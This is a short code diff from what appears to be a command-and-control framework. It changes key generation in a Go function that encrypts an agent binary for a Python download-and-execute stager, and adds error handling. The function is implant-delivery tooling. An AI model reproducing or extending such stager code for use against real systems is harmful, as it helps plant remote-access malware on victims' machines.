@@ -3,7 +3,6 @@
 
 package cc
 
-
 import (
 	"fmt"
 	"os"
@@ -14,7 +13,11 @@ import (
 
 func python_http_xor_download_exec(agent_bin_path, url string) (ret []byte) {
 	// encrypt payload (agent binary)
-	key := tun.GenAESKey(util.RandStr(10))
+	key, err := tun.GenerateRandomBytes(10)
+	if err != nil {
+		CliPrintError("python stager failed to generate random key: %v", err)
+		return
+	}
 	fdata, err := os.ReadFile(agent_bin_path)
 	if err != nil {
 		CliPrintError("python stager failed to read agent binary: %v", err)
